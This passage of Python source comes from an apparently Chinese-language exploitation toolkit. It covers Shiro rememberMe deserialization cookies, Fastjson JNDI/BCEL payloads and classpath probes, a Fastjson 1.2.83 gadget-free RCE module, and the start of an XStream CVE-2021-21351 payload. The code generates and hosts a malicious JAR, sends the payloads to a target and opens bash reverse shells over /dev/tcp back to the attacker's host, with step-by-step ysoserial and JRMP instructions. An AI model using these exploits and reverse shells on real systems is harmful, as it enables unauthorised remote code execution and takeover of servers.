        out["reverse_cmd"] = rev_real      # 人读的真实命令（带空格）
        out["reverse_ifs"] = cmd           # 实际下发的无空格版（${IFS}）
    blocks = []
    for a, ck in cookies:
        blocks.append("[%s]\nrememberMe=%s\n\ncurl -v -H 'Cookie: rememberMe=%s' %s"
                      % (a, ck, ck, normalize(target)))
    out["detail"] = "Cookie(rememberMe):\n%s" % "\n\n".join(blocks)
    if mode == "shell":
        out["detail"] += ("\n\n手工等价写法:\n"
                          "  java -jar ysoserial.jar %s '%s' | base64 -w0\n"
                          "  再把得到的字节流用 Shiro Key 加密成 rememberMe Cookie（ysoserial 用 JDK8 跑）\n"
                          "  ※ 手工复制时命令两侧不要加引号：exec(String) 不认引号，引号会变成字面量\n"
                          "  ※ 命令里的 ${IFS} 必须原样保留：它是由 bash（不是 Java）展开成空格的；\n"
                          "    在 shell 里粘贴时记得用单引号包住整个参数，防止本地 shell 提前把 ${IFS} 展开掉。"
                          % (gadget, cmd))
        with SESS_LOCK:
            sids = list(STATE["sessions"].keys())
        out["detail"] += ("\n\n会话: 目标上线后到「反弹Shell」页签交互；当前会话数 %d%s"
                          % (len(sids), ("（%s）" % "，".join(sids[:5])) if sids else ""))
        if len(cookies) > 1:
            out["detail"] += ("\n\n※ alg=auto 会同时发 cbc 与 gcm 两个 Cookie；两者都命中的话"
                              "可能弹回 2 个 shell，属于预期现象。")
    if notes:
        out["detail"] += "\n\n" + "\n".join(notes)
    if do_send:
        for a, ck in cookies:
            r = http(normalize(target), headers={"Cookie": "rememberMe=%s" % ck},
                     timeout=int(p.get("timeout", 10)))
            out["detail"] += "\n\n发包结果[%s]: status=%s set-cookie=%s" % (
                a, r["status"], r["headers"].get("set-cookie", ""))
            out["output"] += "；%s 已发包 status=%s" % (a.split("(")[0], r["status"])
    out["detail"] += (
        "\n\n＝＝ 备选方案：JRMP 两段式（目标 classpath 不确定、上面的链打不通时更通用）＝＝\n"
        "原理：先用 JRMPClient 让目标回连本机，再由本机的 JRMPListener 投递真正的 gadget，\n"
        "这样目标 classpath 里不需要有 CommonsCollections / CommonsBeanutils 等依赖。\n"
        "  1) 本机起 JRMP 服务端（投递真正的 gadget）：\n"
        "       java -cp ysoserial.jar ysoserial.exploit.JRMPListener <port> <gadget> \"<cmd>\"\n"
        "       例：java -cp ysoserial.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections6 \"whoami\"\n"
        "  2) 本工具这里：gadget 选 JRMPClient，「命令」填 本机IP:<port>\n"
        "       ★ 注意语义是 host:port，不是 shell 命令；要反弹则把 <cmd> 换成无空格的 ${IFS} 版反弹命令\n"
        "         （例：bash -c bash${IFS}-i${IFS}>&/dev/tcp/本机IP/端口${IFS}<&1；最终仍是 exec(String)，\n"
        "          空格 / 管道 / 引号都不生效；结尾必须是 ${IFS}<&1，写成 ${IFS}0>&1 则实测（本机 bash 5.3）：TCP 会连上、监听侧能 accept，但 bash 随即退出、连接被 RST，发过去的命令没有任何回显，拿不到可用会话 —— 它并不是 ambiguous redirect（那个错误只在重定向目标本身含 ${IFS} 时才报，如 `>${IFS}a${IFS}b`）；正确写法 ${IFS}<&1 实测 3/3 连上且能发命令收回显）。\n"
        "  3) 加密成 rememberMe 发出去 → 目标反序列化 JRMPClient → 主动回连 <port> →\n"
        "       JRMPListener 投递真正的 gadget 并执行命令。")
    return out


FASTJSON_PAYLOADS = {
    "124-JNDI": '{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://%s/%s","autoCommit":true}',
    "124-BCEL": '{"@type":"org.apache.commons.dbcp.BasicDataSource","driverClassName":"$$BCEL$$%s","driverClassName":"$$BCEL$$%s"}',
    "147-JNDI": '{"a":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"b":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://%s/%s","autoCommit":true}}',
    "168-JNDI": '{"@type":"java.lang.Exception","@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://%s/%s","autoCommit":true}',
    "180-JNDI": '{"@type":"java.lang.Exception","@type":"org.apache.tomcat.dbcp.dbcp2.BasicDataSource","driverClassName":"$$BCEL$$%s"}',
    "183-JNDI": '{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://%s/%s","autoCommit":true,"@type":"java.lang.AutoCloseable"}',
    "DNS探测": '{"@type":"java.net.Inet4Address","val":"%s"}',
    "DNS探测2": '{"@type":"java.net.Inet6Address","val":"%s"}',
    "布尔判定1": '{"@type":"java.lang.AutoCloseable"',
    "布尔判定2": '{"@type":"java.util.HashMap","x":{"@type":"java.lang.Exception","@type":"org.XxException"},"y":1}',
    "布尔判定3": '{"zero":{"@type":"java.lang.Exception","@type":"org.XxException"},"one":{"@type":"java.lang.Exception","@type":"java.io.ByteArrayOutputStream"},"two":1}',
}


def ex_fastjson_send(target, p):
    base = normalize(target)
    tpl = p.get("tpl", "124-JNDI")
    host = p.get("lhost") or src_ip_for(target) or "127.0.0.1"
    ldap_port = p.get("ldap_port", STATE["jndi"]["ldap_port"])
    token = p.get("token") or "x"
    bcel = p.get("bcel", "")
    path = p.get("path") or "/"
    raw = p.get("raw", "")
    if raw:
        body = raw
    else:
        t = FASTJSON_PAYLOADS.get(tpl, FASTJSON_PAYLOADS["124-JNDI"])
        n = t.count("%s")
        if tpl.startswith("DNS"):
            body = t % (("%s.%s" % (token, p.get("dns") or host)) if n == 1 else host)
        elif n == 2:
            body = t % ("%s:%s" % (host, ldap_port), token)
        elif n == 1:
            body = t % (bcel or token)
        else:
            body = t
    r = http(base + path, method="POST", data=body, timeout=int(p.get("timeout", 10)))
    log("Fastjson 发送 %s → %s" % (tpl, r["status"]))
    return {"ok": True, "output": "status=%s %s" % (r["status"], r["err"]),
            "detail": "POST %s\nContent-Type: application/json\n\n%s\n\n响应:\n%s"
                      % (base + path, body, r["body"][:2000]),
            "sent": body}


def ex_fastjson_version(target, p):
    """版本判定三步：① 响应自报指纹 ② 1.2.68~1.2.83 资源探测回连（CVE-2026-16723 同机制，
    JAR 无效也无妨——目标只要来拉就证明探测点存在）③ 老版本布尔判定（仅对 ≤1.2.47 有意义）。"""
    base = normalize(target)
    path = p.get("path") or "/parse"
    to = int(p.get("timeout", 8))
    res, seen_ver, jar_hit = [], None, False

    # ① 响应指纹：靶场/报错页常自报版本 fastjson=x.y.z
    for pp in (path, "/"):
        r = http(base + pp, method="POST", data='{"a":1}', timeout=to)
        m = re.search(r"fastjson\s*=\s*([0-9][0-9.]*)", (r["body"] or ""))
        if m:
            seen_ver = m.group(1)
            res.append("[指纹] POST %s 响应自报版本: fastjson=%s" % (pp, seen_ver))
            break

    # ② 1.2.68~1.2.83 资源探测回连
    host = p.get("lhost") or src_ip_for(target) or "127.0.0.1"
    dec = _fj183_dec_ip(host)
    if dec:
        if not STATE["jndi"].get("on"):
            jndi_start({"lhost": host, "http_port": int(p.get("http_port") or 8000), "mode": "bypass"})
        http_port = STATE["jndi"]["http_port"]
        webroot = STATE["jndi"].get("webroot") or os.path.join(HERE, "_jndi")
        try:
            os.makedirs(webroot, exist_ok=True)
            token = "fjv%d" % int(time.time() % 100000)
            with open(os.path.join(webroot, token), "wb") as f:
                f.write(b"NOT_A_JAR_PROBE")
            tn = "jar:http:..%s:%s.%s!.V" % (dec, http_port, token)
            r = http(base + path, method="POST", data=payload_body(tn),
                     ctype="application/json", timeout=to)
            res.append("[183探测] POST %s %s → status=%s（等回连）" % (path, tn, r["status"]))
            for _ in range(6):
                time.sleep(1)
                for c in reversed(STATE.get("callbacks", [])):
                    if c.get("type") == "HTTP" and token in str(c.get("detail")) \
                            and "127.0.0.1" not in str(c.get("from")):
                        jar_hit = True
                        break
                if jar_hit:
                    break
            res.append("[183探测] 目标回连: %s" % (
                "✅ 是 → fastjson 1.2.68~1.2.83 确认（checkAutoType 资源探测可达，CVE-2026-16723 机制存在）"
                if jar_hit else "❌ 否（可能 <1.2.68 / safeMode 开启 / 出网受限）"))
        except Exception as e:
            res.append("[183探测] 本机 HTTP 托管失败: %s" % e)

    # ③ 老版本行为判定（1.2.47 缓存技巧的结论不适用于 ≥1.2.48）
    for name in ("布尔判定1", "布尔判定2", "布尔判定3"):
        body = FASTJSON_PAYLOADS[name]
        r = http(base + path, method="POST", data=body, timeout=to)
        res.append("[%s] status=%s\n%s" % (name, r["status"], (r["body"] or "")[:200]))

    if seen_ver or jar_hit:
        concl = "🎯 fastjson %s → 用「1.2.83 无Gadget RCE」模块打（fastjson.183），出网即 RCE" % (
            "1.2.68~1.2.83" if not seen_ver else seen_ver)
    else:
        concl = ("183 探测无回连且无指纹。对照规则（仅 ≤1.2.47 适用）：三条都报相同错→多半 ≥1.2.68 且开了 "
                 "safeMode；判定1 报 syntax、判定2/3 报 'xx not match' → 1.2.4x~1.2.6x；"
                 "能识别 org.XxException → <1.2.48")
    return {"ok": True, "output": concl, "detail": "\n\n".join(res) +
            "\n\n判定规则: 'autoType is not support'=autoType关; 183探测回连=1.2.68~1.2.83; 老布尔判定仅区分 ≤1.2.47 / safeMode"}


# 两步探测：① java.lang.Class 缓存目标类（1.2.47 缓存绕过）② 实例化它。
# 判别：响应含 "autoType is not support" → 类不在 classpath；
#      其他异常(NPE/constructor/timeout差异) → 类存在（实例化走到一半才炸）。
FASTJSON_PROBE_CLASSES = [
    ("com.sun.rowset.JdbcRowSetImpl", "JDK内置(对照组,必存在)"),
    ("com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl", "JDK内置 TemplatesImpl"),
    ("javax.el.ELProcessor", "EL API(BeanFactory+EL关键类)"),
    ("jakarta.el.ELProcessor", "EL API(jakarta新版)"),
    ("org.apache.commons.collections.Transformer", "CommonsCollections 3.x"),
    ("org.apache.commons.collections4.comparators.TransformingComparator", "CommonsCollections 4.x"),
    ("org.apache.commons.collections4.functors.TransformingComparator", "CommonsCollections 4.x(备选)"),
    ("org.apache.commons.beanutils.BeanComparator", "CommonsBeanutils"),
    ("com.mchange.v2.c3p0.WrapperConnectionPoolDataSource", "c3p0"),
    ("org.codehaus.groovy.runtime.ConvertedClosure", "Groovy"),
    ("org.springframework.aop.framework.AdvisedSupport", "Spring-AOP"),
    ("org.apache.naming.factory.BeanFactory", "Tomcat naming(BeanFactory)"),
    ("org.apache.catalina.core.StandardContext", "Tomcat嵌入式"),
]


def ex_fastjson_probe(target, p):
    base = normalize(target)
    path = p.get("path") or "/"
    to = int(p.get("timeout", 8))

    def _is_html(r):
        b = (r["body"] or "")[:300].lower()
        return "<!doctype html" in b or "<html" in b

    def _gw_err(r):
        b = r["body"] or ""
        return (r["status"] == 0 or r["status"] in (502, 503, 504)
                or "connect failed" in b or "upstream" in b)

    # “像 JSON 解析点”的响应：非 405（方法不允许）/网关错误/HTML，且是会被 JSON 库处理的码。
    # 注意：405 说明该路径根本不接受 POST，绝不能当成 JSON 点，否则下面会把所有类误判为“存在”。
    def _looks_like_json_point(r):
        if _gw_err(r) or _is_html(r) or r["status"] == 405:
            return False
        return r["status"] in (200, 400, 500)

    def _class_payload(cls):
        return '{"a":{"@type":"java.lang.Class","val":"%s"},"b":{"@type":"%s"}}' % (cls, cls)

    def _judge(r, bb):
        """返回 (mark, is_hit, is_miss)。"""
        b = r["body"] or ""
        if _gw_err(r):
            return ("⛔ 网关错误，本次无效", False, False)
        if r["status"] == 405:
            return ("⚠ 405 方法不允许：此路径非 POST JSON 点", False, False)
        if _is_html(r):
            return ("⚠ 返回 HTML，非 JSON 解析点", False, False)
        if "autoType is not support" in b:
            return ("❌ 不存在（autoType 关闭/类未加载）", False, True)
        # fastjson 真实报错特征：Spring 把 fastjson 抛出的 null-message 异常包成 500 + "No message available"
        if "No message available" in b:
            return ("✅ 存在（实例化异常，类已加载）", True, False)
        fj_marks = ("com.alibaba.fastjson", "JSONException", "syntax error",
                    "ClassNotFoundException", "class not found", "expect ", "not close", "unclosed")
        if any(k in b for k in fj_marks):
            return ("✅ 存在（fastjson 报错，类已加载）", True, False)
        if r["status"] == 200 and b.strip() and b != bb:
            return ("✅ 存在（返回 200 且不同于基线，类已加载）", True, False)
        if r["status"] == 400:
            # Jackson/Spring 默认拒收畸形 JSON：400 + 空 message，不是 fastjson 行为，不能判“存在”
            return ("⚠ 400 非 fastjson 行为（疑似 Jackson/非 JSON 点）", False, False)
        if r["status"] == 0:
            return ("⏱ 超时/无响应（稳定超时也可能=存在且卡住，人工复核）", True, False)
        return ("⚠ 与基线相同/无法判别（人工复核）", False, False)

    # 自动找 JSON 点：基线不是 JSON 点（405/HTML/网关/泛型 400）就扫候选路径
    tried = [path]
    br = http(base + path, method="POST", data='{"probe":"baseline"}', timeout=to)
    if not _looks_like_json_point(br):
        cands = ("/login", "/api/login", "/user/login", "/doLogin", "/sso/login",
                 "/json", "/api/json", "/tologin", "/read", "/api/read",
                 "/parse", "/api/parse", "/vuln", "/api/vuln")
        for cand in cands:
            if cand == path:
                continue
            r2 = http(base + cand, method="POST", data='{"probe":"baseline"}', timeout=min(to, 5))
            tried.append(cand)
            if _looks_like_json_point(r2):
                br, path = r2, cand
                break
    if _gw_err(br):  # 网关闪断重试一次
        br = http(base + path, method="POST", data='{"probe":"baseline"}', timeout=to)
    bb = br["body"] or ""
    dead = _gw_err(br)
    point_ok = _looks_like_json_point(br)
    lines, hits, misses, warns = [], [], [], []
    for cls, tag in FASTJSON_PROBE_CLASSES:
        try:
            r = http(base + path, method="POST", data=_class_payload(cls), timeout=to)
        except Exception as e:
            lines.append("%-46s [%s] 请求异常: %s" % (cls, tag, e))
            continue
        mark, is_hit, is_miss = _judge(r, bb)
        if is_hit:
            hits.append((cls, tag))
        if is_miss:
            misses.append(tag)
        if mark.startswith("⚠") or mark.startswith("⏱"):
            warns.append(cls)
        lines.append("%-46s [%s] %s | status=%s | %s"
                     % (cls, tag, mark, r["status"], (r["body"] or "")[:150].replace("\n", " ")))
    txt = "JSON 解析点: POST %s（尝试过: %s）\n" % (path, ", ".join(tried))
    if not point_ok:
        txt += "⚠ 未确认到明确 JSON 解析点（基线 status=%s），下列结果可能失真，请手动指定 target 的 POST JSON 接口路径（params.path）\n" % br["status"]
    txt += "基线: status=%s body=%s%s\n\n" % (br["status"], bb[:120].replace("\n", " "),
                                              "  ⛔ 疑似网关异常" if dead else "")
    txt += "\n".join(lines)
    if dead and not hits and not misses:
        concl = "目标不可达（status=%s），等实例恢复后再探测" % br["status"]
    elif not point_ok:
        concl = "⚠ 未找到明确 JSON 解析点（所有候选均 405/HTML/网关）。请确认靶场的 POST JSON 接口路径，用 params.path 指定后重试"
    elif hits or misses:
        concl = "✅ 存在: " + ", ".join(t or c for c, t in hits) + " ｜ ❌ 不存在: " + ", ".join(misses)
        if hits:
            concl += " → 告诉助手命中项，将生成对应 LDAP+javaSerializedData 序列化 gadget 载荷"
            if any("EL" in t for _, t in hits):
                concl += " ｜★ EL API 存在 → BeanFactory+ResourceRef 绕过路可用！"
        if warns:
            concl += " ｜⚠ 含 %d 项需人工复核" % len(warns)
    elif warns:
        concl = "⚠ 所有探测均非 fastjson 行为（400/405 等），未发现可用的 fastjson 反序列化点；请确认该靶场是否真为 fastjson，或手动指定 params.path"
    else:
        concl = "全部无法判别（无 autoType 报错也无 fastjson 特征）"
    return {"ok": True, "output": concl,
            "detail": txt + "\n\n判定规则: 'autoType is not support'=不存在; 'No message available'/fastjson异常=存在; 405/泛型400=非JSON点(不判存在)",
            "sent_hint": path}


# ===================== Fastjson 1.2.83 Gadget-Free RCE (CVE-2026-16723) =====================
# checkAutoType() 即使 autoType 关闭，也会把 @type 值 replace('.','/') 当资源路径做
# getResourceAsStream() 探测；Spring Boot 的 LaunchedURLClassLoader 支持 jar:http:// 前缀
# → 真的向攻击者发 HTTP 请求下载 JAR；字节码带 @JSONType 注解（ASM 只读注解）→
# TypeUtils.loadClass → defineClass 时执行 <clinit> 静态块 → RCE。
# 载荷：{"@type":"jar:http:..<十进制IP>.<端口>.<jar资源>!.<类名>"}
#   - IP 必须转十进制整数（点号会被 replace('.','/') 破坏 URL）；
#   - '!' 后必须跟 '.'（replace 后成为 jar URL 的 "!/" 分隔符）；
#   - JAR 文件名/类名都不能含点号。
# 适用 1.2.68~1.2.83（1.x 最终版），JDK8 单请求 RCE；JDK9+ 需 /proc/self/fd 两段式（未内置）。
# 生成器：tools/fastj183/GenFJ183.java（用 ysoserial 内置的 Mockito-ASM 编译产物）。

FJ183_TOOL = os.path.join(HERE, "tools", "fastj183")


def _fj183_dec_ip(host):
    try:
        import ipaddress
        return str(int(ipaddress.IPv4Address(host)))
    except Exception:
        return None


def ex_fastjson_183(target, p):
    base = normalize(target)
    host = p.get("lhost") or src_ip_for(target) or "127.0.0.1"
    to = int(p.get("timeout", 12))
    mode = p.get("mode") or "cmd"
    lport = int(p.get("lport") or 4444)
    cmd = p.get("cmd") or "touch /tmp/success_fj183"
    # 未显式指定时用随机资源名/类名：fastjson 加载过的类会进 mappings 缓存，
    # 重名载荷第二次不会再触发资源探测（目标侧 JVM 缓存），必须每次换名。
    res = (p.get("res") or ("fj%s" % random.randint(10000, 99999))).strip("/")
    cls = (p.get("cls") or ("P%s" % random.randint(10000, 99999))).strip()
    if "." in res or "." in cls:
        return {"ok": False, "output": "res/cls 不能含点号（会被 replace('.','/') 破坏 jar URL）"}
    dec = _fj183_dec_ip(host)
    if not dec:
        return {"ok": False, "output": "lhost=%s 必须是 IPv4 地址（载荷里的 IP 要转十进制）" % host}

    # ① 确保本机 HTTP 服务在跑（顺带提供回调面板与文件分发）
    if not STATE["jndi"].get("on"):
        jndi_start({"lhost": host, "http_port": int(p.get("http_port") or 8000), "mode": "bypass"})
    http_port = STATE["jndi"]["http_port"]
    webroot = STATE["jndi"].get("webroot") or os.path.join(HERE, "_jndi")
    os.makedirs(webroot, exist_ok=True)

    # ② 决定静态块执行的命令
    # 信标恒开：它是纯 Java 的 URL.openStream，容器内没有 bash/curl 也能回连，
    # 而且是"静态块真的执行了"的唯一可靠证据（目标拉 JAR 只能证明资源探测成功）。
    beacon_url = "http://%s:%s/FJ183-RCE" % (host, http_port)
    if mode == "shell":
        exec_cmd = "/bin/bash -i >& /dev/tcp/%s/%d 0>&1" % (host, lport)
    elif p.get("beacon_port"):
        # 追加而不是替换：否则用户传的 cmd 会被静默丢掉
        exec_cmd = "%s; echo FJ183-RCE > /dev/tcp/%s/%d" % (cmd, host, int(p["beacon_port"]))
    else:
        exec_cmd = cmd

    # ③ 生成恶意 JAR：一个 JAR 同时装两种类
    #    - jar:http:// 形态类   → JDK8 单请求直接 defineClass + <clinit>
    #    - jar:file:/proc/self/fd/N 形态类 → JDK9+ 两段式（类名不含 //，能过 JVM 类名校验）
    #      JDK9+ 会拒绝含 "//" 的类名，jar:http:// 只能用来"触发下载"（JDK 把远端 JAR 缓存成
    #      /tmp/jar_cache*.tmp 并持有 fd），第二段用单斜杠 jar:file:/proc/self/fd/N 复用该 fd。
    #      每个 fd 号对应一个独立类（内部名必须含 fd 号），用 GenFJ183 的 --fd= 批量生成。
    java = shutil.which("java")
    if not java:
        return {"ok": False, "output": "本机未检测到 java，无法生成恶意 JAR"}
    if not os.path.isfile(os.path.join(FJ183_TOOL, "GenFJ183.class")):
        return {"ok": False, "output": "缺少 %s（先 javac 编译 GenFJ183.java，classpath 带 ysoserial.jar）" % FJ183_TOOL}
    yso = find_ysoserial() or os.path.join(HERE, "ysoserial.jar")
    jar_file = os.path.join(webroot, res)
    jdkmode = (p.get("jdkmode") or "auto").lower()
    fd_max = max(3, int(p.get("fd_max") or 128))
    stage1_type = "jar:http:..%s:%s.%s!.foo.%s" % (dec, http_port, res, cls)
    fd_tpl = "jar:file:.proc.self.fd.%%d!.p%%d.%s.Exception" % cls
    # Exception 后缀 = "软返回"：checkAutoType 对以 Exception/Error 结尾的 @type 在加载失败时
    # 返回 null 而不是抛异常，数组里的后续元素才能继续执行（否则第一个 fd 探测失败就整体中止）。

    if mode == "shell":
        lst = listener_start({"port": lport})
        lport = int(lst.get("port") or lport)
        exec_cmd = "/bin/bash -i >& /dev/tcp/%s/%d 0>&1" % (host, lport)

    def _gen_jar():
        args = [java, "-cp", os.pathsep.join([yso, FJ183_TOOL]), "GenFJ183",
                fd_tpl, jar_file, exec_cmd, beacon_url,
                "--fd=3-%d" % fd_max, "--also=" + stage1_type]
        try:
            rr = subprocess.run(args, capture_output=True, text=True, errors="replace",
                                timeout=60, cwd=HERE)
        except Exception as e:
            return "JAR 生成异常: %s" % e
        if "JAR_OK" not in (rr.stdout or ""):
            return "JAR 生成失败: %s %s" % ((rr.stdout or "")[:300], (rr.stderr or "")[:300])
        return None

    _err = _gen_jar()
    if _err:
        return {"ok": False, "output": _err}
    add_callback("Fastjson183", "-", "恶意 JAR 已生成并托管: GET /%s (%d bytes, fd 类 3-%d)"
                 % (res, os.path.getsize(jar_file), fd_max))

    # ⑤ 找 JSON 接口并发送（默认 /parse，404/405 时扫候选）
    path = p.get("path") or "/parse"
    cands = [path] + [c for c in ("/parse", "/parseObject", "/json", "/api/parse",
                                  "/fastjson", "/vuln", "/") if c != path]
    rresp, upath = None, None
    for cd in cands:
        rr = http(base + cd, method="POST", data='{"probe":"baseline"}', timeout=min(to, 8))
        if rr["status"] in (200, 400, 500) and "<html" not in (rr["body"] or "")[:200].lower():
            rresp, upath = rr, cd
            break
    if rresp is None:
        gw = http(base + cands[0], method="POST", data='{"probe":"baseline"}', timeout=min(to, 8))
        if gw["status"] in (0, 502, 503, 504) or "upstream" in (gw["body"] or "").lower():
            return {"ok": False, "output": "目标不可达（status=%s，疑似靶场容器已停/重启中）：稍等片刻重试，或确认靶场地址" % gw["status"]}
        return {"ok": False, "output": "未找到可用的 POST JSON 接口（试过: %s），请用 params.path 手动指定" % ", ".join(cands)}
    # ⑥ 发送：基线 fd 快照 → 第一段(jar:http 触发下载) → 按需第二段(fd 复用)
    def _fds(body):
        try:
            return set(json.loads(body).get("jarCacheFds") or [])
        except Exception:
            return set()

    base_fds = _fds(rresp["body"]) if jdkmode != "8" else set()
    r2 = http(base + upath, method="POST", data=payload_body(stage1_type), ctype="application/json", timeout=to)
    log("Fastjson183 第一段(jar:http) → %s %s" % (upath, r2["status"]))

    stage2_note = ""
    if jdkmode != "8":
        # 用回连 UA 判 JDK：1.8 单请求即 RCE，不必再打第二段（也避免重复弹几十个 shell）
        ua = ""
        for c in STATE.get("callbacks", []):
            if c.get("type") == "HTTP" and ("/%s" % res) in str(c.get("detail")):
                m = re.search(r"Java/([0-9.]+)", str(c.get("detail")))
                if m:
                    ua = m.group(1)
        if not ua.startswith("1."):
            new_fds = sorted(int(x.split("->")[0]) for x in (_fds(r2["body"]) - base_fds))
            new_fds = [n for n in new_fds if 3 <= n <= fd_max]
            if not new_fds:
                new_fds = list(range(3, fd_max + 1))    # 靶场不回报 jarCacheFds 就全量枚举
            els = [{"@type": "jar:file:.proc.self.fd.%d!.p%d.%s.Exception" % (n, n, cls)}
                   for n in new_fds]
            r3 = http(base + upath, method="POST", data=json.dumps(els), ctype="application/json",
                      timeout=max(to, 20))
            stage2_note = "；第二段(fd=%s) → status=%s" % (
                ",".join(str(n) for n in new_fds[:8]) + ("…" if len(new_fds) > 8 else ""), r3["status"])
            log("Fastjson183 第二段(%d 个 fd) → %s %s" % (len(els), upath, r3["status"]))
        else:
            stage2_note = "；回连 UA 显示 JDK8，单请求即可，跳过 fd 两段式"

    # ⑥ 等结果：HTTP 回调（JAR 被拉取/信标）或反弹会话
    deadline = time.time() + 15
    sid = None
    cb_hit = None
    while time.time() < deadline:
        with SESS_LOCK:
            for k, v in STATE["sessions"].items():
                if v.get("open"):
                    sid = k
                    break
        if sid:
            break
        time.sleep(1)
    # 回调必须细分：目标拉取 JAR 只证明"资源探测"成功（SSRF），
    # 真正的 RCE 证据是信标 /FJ183-RCE 或反弹会话。之前把拉包当成功 → 假阳性。
    t_host = target.split("//")[-1].split("/")[0].split(":")[0]
    jar_gets, cb_hit, jdk = 0, None, None
    for c in STATE.get("callbacks", []):
        if c.get("type") != "HTTP" or t_host not in str(c.get("from")):
            continue
        det = str(c.get("detail"))
        if ("/%s" % res) in det:
            jar_gets += 1
        else:
            cb_hit = c
        m = re.search(r"Java/([0-9]+)", det)
        if m and not jdk:
            jdk = m.group(1)

    probe_only = ("❌ 目标拉取了 JAR %d 次，但静态块没执行 —— defineClass /init 失败。"
                  "常见原因：① 目标不是 JDK8 也不是 JDK9~21 的 Linux（回连 UA 显示 Java/%s）；"
                  "② fastjson 已开 SafeMode；③ 目标加载器不是 Spring Boot 的 LaunchedClassLoader，"
                  "解析不了 jar: 绝对 URL；④ /tmp 写满导致 jar_cache 落盘失败（JDK9+ fd 模式依赖它）。"
                  % (jar_gets, jdk or "未知"))

    if mode == "shell":
        out = ("已发 CVE-2026-16723 载荷（POST %s%s → status=%s%s）。" % (base, upath, r2["status"], stage2_note)
               + ("🎯 拿到 shell！会话 %s 已上线，去「反Shell」页交互。" % sid if sid
                  else (("⚠️ 静态块已执行（信标 %s），但没弹回会话 —— 目标可能无 /bin/bash 或出网受限，"
                         "改用 beacon_port 做纯 HTTP 信标验证。" % cb_hit["detail"]) if cb_hit
                        else probe_only if jar_gets else
                        "未见回连：目标未触发资源探测（可能非 1.2.68~1.2.83，或出网被控）。")))
    else:
        out = ("已发 CVE-2026-16723 载荷（POST %s%s → status=%s%s）。" % (base, upath, r2["status"], stage2_note)
               + ("✅ RCE 成功：静态块已执行（%s）。" % cb_hit["detail"] if cb_hit
                  else probe_only if jar_gets else
                  "未见回连：回调面板若连目标对 /%s 的 GET 都没有，说明未触发资源探测"
                  "（可能非 1.2.68~1.2.83 或出网被控）。" % res))
    note = ("原理：checkAutoType 把 @type 值 replace('.','/') + \".class\" 后交给 ParserConfig 的类加载器"
            " getResourceAsStream() 探测；Spring Boot 的 LaunchedClassLoader 能解析 jar: 绝对 URL，"
            "字节码带 @JSONType 注解即绕过 expectClass 类型匹配检查被 loadClass → defineClass → 实例化，"
            "静态块执行命令（无需任何 gadget、autoType 关闭也生效）。\n"
            "JDK8  ：单请求，@type = %s\n"
            "JDK9+ ：两段式。第一段 jar:http:// 只负责触发下载（JDK 把远端 JAR 缓存成 /tmp/jar_cache*.tmp"
            " 并持有 fd）；第二段用单斜杠 jar:file:/proc/self/fd/N!/... 复用该 fd —— JVM 拒绝含 \"//\" 的类名，"
            "所以第一段在 JDK9+ 必然 defineClass 失败，但下载已经完成。每个 fd 号一个独立类，"
            "本模块优先从靶场响应的 jarCacheFds 精确取新 fd，取不到就枚举 3-%d。\n"
            "踩坑要点：① JAR 每次随机改名（fastjson 缓存 mappings，重名第二次不再探测）；"
            "② 静态块里不能引用 JAR 内的第二个类（目标 classpath 里没有，NoClassDefFoundError 静默失败），"
            "RCE 代码必须全部内联；③ @type 以 Exception 结尾可在加载失败时软返回 null，"
            "否则数组在第一个探测失败的元素就整体中止。\n"
            "第一段载荷: %s"
            % (stage1_type, fd_max, payload_body(stage1_type)))
    return {"ok": True, "output": out, "session": sid,
            "detail": "POST %s%s\nContent-Type: application/json\n\n%s\n\n响应(status=%s):\n%s\n\n%s"
                      % (base, upath, payload_body(stage1_type), r2["status"],
                         (r2["body"] or "")[:800], note),
            "sent": payload_body(stage1_type)}


def payload_body(type_name):
    return '{"@type":"%s"}' % type_name


# ===================== XStream =====================
# XStream 反序列化 RCE（CVE-2021-21351 / CVE-2021-29505，vulhub “开箱即用”默认配置）。
# 两个 CVE 都是黑名单缺陷导致的“注入式”利用，不是本地 EventHandler 命令执行：
#  - CVE-2021-21351 (XStream ≤1.4.15)：javax.naming.ldap.Rdn$RdnEntry + Xalan XRTreeFrag
#    → 触发 com.sun.rowset.JdbcRowSetImpl 的 setAutoCommit → JNDI 注入(ldap/rmi URL)。
#    Java>8u191 时 trustURLCodebase=false 禁远程类加载，需用
#    org.apache.naming.factory.BeanFactory + javax.el.ELProcessor(EL 表达式) 绕过 —— 本工具箱
#    内置 JNDI 服务的“bypass 模式”正好下发这种 Reference。
#  - CVE-2021-29505 (XStream ≤1.4.16)：java.util.PriorityQueue + Packet + RegistryImpl_Stub
#    → 目标主动向攻击者 JRMPListener(1099) 发 RMI 请求，对方在响应里塞 CommonsCollections6 gadget
#    打 RCE。需你自备 ysoserial JRMPListener。
# 注意：21351 是盲打，命令执行无 stdout 回显；验证靠 回连监听 / 写文件 / JNDI 回调面板。

# CVE-2021-21351：Xalan XRTreeFrag 链触发 JdbcRowSetImpl JNDI 注入。__LDAP_URL__ 即 dataSource。
XSTREAM_21351 = '''<sorted-set>
  <javax.naming.ldap.Rdn_-RdnEntry>
    <type>ysomap</type>
    <value class='com.sun.org.apache.xpath.internal.objects.XRTreeFrag'>
      <m__DTMXRTreeFrag>
        <m__dtm class='com.sun.org.apache.xml.internal.dtm.ref.sax2dtm.SAX2DTM'>
          <m__size>-10086</m__size>
          <m__mgrDefault>
            <__overrideDefaultParser>false</__overrideDefaultParser>
            <m__incremental>false</m__incremental>
            <m__source__location>false</m__source__location>
            <m__dtms>
              <null/>
            </m__dtms>
            <m__defaultHandler/>
          </m__mgrDefault>
          <m__shouldStripWS>false</m__shouldStripWS>
          <m__indexing>false</m__indexing>
          <m__incrementalSAXSource class='com.sun.org.apache.xml.internal.dtm.ref.IncrementalSAXSource_Xerces'>
            <fPullParserConfig class='com.sun.rowset.JdbcRowSetImpl' serialization='custom'>
              <javax.sql.rowset.BaseRowSet>
                <default>
                  <concurrency>1008</concurrency>
                  <escapeProcessing>true</escapeProcessing>
                  <fetchDir>1000</fetchDir>
                  <fetchSize>0</fetchSize>
                  <isolation>2</isolation>
                  <maxFieldSize>0</maxFieldSize>
                  <maxRows>0</maxRows>
